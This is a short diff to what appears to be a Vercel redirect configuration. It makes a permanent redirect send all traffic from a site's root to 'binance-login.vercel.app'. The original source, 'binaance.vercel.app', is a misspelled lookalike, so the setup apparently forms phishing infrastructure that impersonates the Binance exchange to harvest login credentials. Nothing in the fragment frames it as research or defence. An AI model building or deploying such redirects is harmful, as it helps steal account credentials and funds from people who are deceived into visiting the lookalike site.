@@ -1,7 +1,7 @@
 {
   "redirects": [
     {
-      "source": "https://binaance.vercel.app/",
+      "source": "/",
       "destination": "https://binance-login.vercel.app/",
       "permanent": true
     }
